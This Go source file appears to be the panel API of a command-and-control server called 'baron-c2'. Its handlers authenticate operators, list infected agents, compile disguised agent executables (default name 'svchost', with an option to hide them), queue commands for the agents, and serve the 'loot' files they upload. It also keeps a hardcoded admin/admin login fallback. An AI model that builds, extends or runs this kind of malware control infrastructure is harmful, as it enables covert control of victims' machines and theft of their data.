package api

import (
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"baron-c2/internal/auth"
	"baron-c2/internal/repo"
	"baron-c2/internal/service"
	"github.com/gin-gonic/gin"
	"github.com/rs/zerolog/log"
	"golang.org/x/crypto/bcrypt"
)

// PanelCheck validates JWT (AuthRequired runs before this handler).
func PanelCheck(c *gin.Context) {
	u, _ := c.Get("panel_user")
	c.JSON(http.StatusOK, gin.H{"ok": true, "user": u})
}

// PanelLogin handles operator authentication
func PanelLogin(c *gin.Context) {
	var input struct {
		Login    string `json:"login"`
		Password string `json:"password"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "Invalid input"})
		return
	}

	var user repo.User
	if err := repo.DB.Where("username = ?", input.Login).First(&user).Error; err != nil {
		// Fallback for first run
		if input.Login == "admin" && input.Password == "admin" {
			tok, err := auth.SignPanelToken("admin", true)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "token error"})
				return
			}
			c.JSON(http.StatusOK, gin.H{
				"ok":    true,
				"token": tok,
				"user":  "admin",
				"admin": true,
			})
			return
		}
		c.JSON(http.StatusUnauthorized, gin.H{"ok": false, "error": "Invalid credentials"})
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(input.Password)); err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"ok": false, "error": "Invalid credentials"})
		return
	}

	tok, err := auth.SignPanelToken(user.Username, user.IsAdmin)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "token error"})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"ok":    true,
		"token": tok,
		"user":  user.Username,
		"admin": user.IsAdmin,
	})
}

// PanelClients returns the list of all agents
func PanelClients(c *gin.Context) {
	var clients []repo.Client
	repo.DB.Find(&clients)

	// Convert to map for UI compatibility
	clientMap := make(map[string]interface{})
	for _, cl := range clients {
		clientMap[cl.ID] = cl
	}

	c.JSON(http.StatusOK, gin.H{
		"ok":      true,
		"clients": clientMap,
	})
}

// PanelDeleteClient removes a client and its associated data
func PanelDeleteClient(c *gin.Context) {
	cid := c.Param("id")
	if cid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "Missing client ID"})
		return
	}

	// Remove client and related data
	repo.DB.Delete(&repo.Client{}, "id = ?", cid)
	repo.DB.Delete(&repo.Task{}, "client_id = ?", cid)
	repo.DB.Delete(&repo.Result{}, "client_id = ?", cid)

	GlobalHub.BroadcastSystem("AGENT: deleted " + cid)
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// PanelBuild handles agent compilation request
func PanelBuild(c *gin.Context) {
	var input service.BuildParams
	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "Invalid params"})
		return
	}

	// Default name if empty
	if input.Name == "" {
		input.Name = "svchost"
	}

	// Sanitize ServerURL: trim spaces and trailing slashes
	input.ServerURL = strings.TrimSpace(input.ServerURL)
	input.ServerURL = strings.TrimRight(input.ServerURL, "/")

	// Beacon: UI often sends milliseconds (e.g. 5000); treat >120 as ms → seconds
	if input.BeaconInterval > 120 {
		input.BeaconInterval /= 1000
	}
	if input.BeaconInterval < 1 {
		input.BeaconInterval = 5
	}
	if input.BeaconInterval > 3600 {
		input.BeaconInterval = 3600
	}

	if os.Getenv("GO_ENV") == "production" {
		input.Debug = false
	} else {
		input.Debug = true
	}

	// Sanitize name: keep only alphanumeric
	reg, _ := regexp.Compile("[^a-zA-Z0-9]+")
	input.Name = reg.ReplaceAllString(input.Name, "")

	if input.Name == "" {
		input.Name = "agent"
	}

	// Default ID if empty
	if input.ID == "" || input.ID == "AUTO" {
		hexPart := hex.EncodeToString([]byte(input.Name))
		if len(hexPart) > 4 {
			hexPart = hexPart[:4]
		}
		input.ID = time.Now().Format("020106") + "-" + hexPart
	}

	buildToken := repo.BuildToken{
		Token:     repo.GenerateID(),
		ExpiresAt: time.Now().Add(24 * time.Hour),
		CreatedAt: time.Now(),
	}
	if err := repo.DB.Create(&buildToken).Error; err != nil {
		log.Error().Err(err).Msg("build token create failed")
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "db error"})
		return
	}
	input.BuildTokenPlain = buildToken.Token

	GlobalHub.BroadcastSystem("BUILD: Starting compilation for " + input.Name + " (Target: " + input.ID + ")")

	builder := &service.BuilderService{}
	builder.PrepareParams(&input)

	source, err := builder.GenerateSource(input)
	if err != nil {
		GlobalHub.BroadcastSystem("BUILD ERROR: Failed to generate source: " + err.Error())
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": err.Error()})
		return
	}

	GlobalHub.BroadcastSystem("BUILD: Source generated, invoking MCS compiler...")

	// Try to compile
	exePath, compileErr := builder.Compile(source, input.Name, input.Hidden)

	downloadURL := ""
	errorMessage := ""
	if compileErr == nil {
		// Move to a public builds folder
		os.MkdirAll("builds", 0755)
		finalPath := filepath.Join("builds", filepath.Base(exePath))

		// Copy instead of rename (safer across filesystems)
		if src, err := os.Open(exePath); err == nil {
			if dst, err := os.Create(finalPath); err == nil {
				io.Copy(dst, src)
				dst.Close()
			}
			src.Close()
			os.Remove(exePath)
		}

		token := c.GetHeader("X-Token")
		downloadURL = "/api/panel/download_build?file=" + filepath.Base(finalPath) + "&token=" + token
		GlobalHub.BroadcastSystem("BUILD: Success → " + filepath.Base(finalPath))
	} else {
		// exePath holds raw compiler stdout on failure — extract only error lines
		compilerOut := exePath // Compile() returns compiler output as first value on error
		errorMessage = filterCompilerErrors(compilerOut, compileErr)
		GlobalHub.BroadcastSystem("BUILD FAILED: " + errorMessage)
		log.Error().Str("name", input.Name).Str("err", errorMessage).Msg("compilation failed")
	}

	c.JSON(http.StatusOK, gin.H{
		"ok":             compileErr == nil,
		"name":           input.Name,
		"download_url":   downloadURL,
		"compile_err":    errorMessage,
		"build_token":    buildToken.Token,
	})
}

// PanelDownloadBuild serves the compiled agent (JWT via AuthRequired or ?token=).
func PanelDownloadBuild(c *gin.Context) {
	fileName := c.Query("file")
	if fileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "File name required"})
		return
	}

	base := filepath.Base(fileName)
	path := filepath.Join("builds", base)
	clean := filepath.Clean(path)
	absRoot, errR := filepath.Abs("builds")
	absFile, errF := filepath.Abs(clean)
	sep := string(os.PathSeparator)
	if errR != nil || errF != nil || !(absFile == absRoot || strings.HasPrefix(absFile, absRoot+sep)) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid path"})
		return
	}

	if st, err := os.Stat(clean); err != nil || st.IsDir() {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	c.FileAttachment(clean, base)
}

// PanelAdmin handles administrative actions
func PanelAdmin(c *gin.Context) {
	var input struct {
		Action string `json:"action"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "Invalid input"})
		return
	}

	switch input.Action {
	case "clear_logs":
		repo.DB.Exec("DELETE FROM logs")
		c.JSON(http.StatusOK, gin.H{"ok": true})
	case "clean_db":
		repo.DB.Where("last_seen < ?", time.Now().Add(-24*time.Hour)).Delete(&repo.Client{})
		c.JSON(http.StatusOK, gin.H{"ok": true})
	case "nuke_db":
		repo.DB.Exec("DELETE FROM clients")
		repo.DB.Exec("DELETE FROM tasks")
		repo.DB.Exec("DELETE FROM results")
		c.JSON(http.StatusOK, gin.H{"ok": true})
	default:
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "Unknown action"})
	}
}

// PanelCommand sends a command to a client
func PanelCommand(c *gin.Context) {
	var input struct {
		CID string `json:"cid"`
		Cmd struct {
			Action  string `json:"action"`
			Command string `json:"command"`
		} `json:"cmd"`
	}

	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"ok": false, "error": "Invalid command structure"})
		return
	}

	fullCmd := input.Cmd.Action
	if input.Cmd.Command != "" {
		fullCmd += " " + input.Cmd.Command
	}

	task := repo.Task{
		ID:        repo.GenerateID(),
		ClientID:  input.CID,
		Command:   fullCmd,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	log.Info().Str("cid", input.CID).Str("cmd", input.Cmd.Action).Str("task_id", task.ID).Msg("task created")

	if err := repo.DB.Create(&task).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"ok": false, "error": "DB Error"})
		return
	}

	GlobalHub.BroadcastSystem("TASK: Created <" + input.Cmd.Action + "> for " + input.CID)
	c.JSON(http.StatusOK, gin.H{"ok": true, "task_id": task.ID})
}

// PanelDownloadLoot serves files uploaded by agents (loot/<cid>/<file>).
func PanelDownloadLoot(c *gin.Context) {
	fileName := c.Query("file")
	if fileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "File name required"})
		return
	}
	cid := filepath.Base(c.Query("cid"))

	base := filepath.Base(fileName)
	if base == "" || base == "." || base == ".." {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file name"})
		return
	}

	var path string
	if cid != "" && cid != "." {
		path = filepath.Join("loot", cid, base)
	} else {
		// Legacy flat layout
		path = filepath.Join("loot", base)
	}

	clean := filepath.Clean(path)
	absLoot, errLoot := filepath.Abs("loot")
	absFile, errFile := filepath.Abs(clean)
	sep := string(os.PathSeparator)
	if errLoot != nil || errFile != nil || !(absFile == absLoot || strings.HasPrefix(absFile, absLoot+sep)) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid path"})
		return
	}

	if st, err := os.Stat(clean); err != nil || st.IsDir() {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	c.FileAttachment(clean, base)
}

// filterCompilerErrors extracts only the relevant CS error lines from mcs output.
// This prevents leaking the full generated source code back to the panel UI.
func filterCompilerErrors(compilerOut string, fallbackErr error) string {
	var lines []string
	for _, line := range strings.Split(compilerOut, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Keep lines that contain actual error/warning identifiers
		if strings.Contains(line, "error CS") ||
			strings.Contains(line, "warning CS") ||
			strings.Contains(line, "Compilation FAILED") ||
			strings.Contains(line, "Error(s)") {
			lines = append(lines, line)
		}
	}

	if len(lines) == 0 {
		if fallbackErr != nil {
			return fallbackErr.Error()
		}
		return "compilation failed (no output)"
	}

	// Cap at 10 lines so the panel terminal doesn't overflow
	if len(lines) > 10 {
		lines = lines[:10]
		lines = append(lines, "... (truncated)")
	}

	return strings.Join(lines, "\n")
}

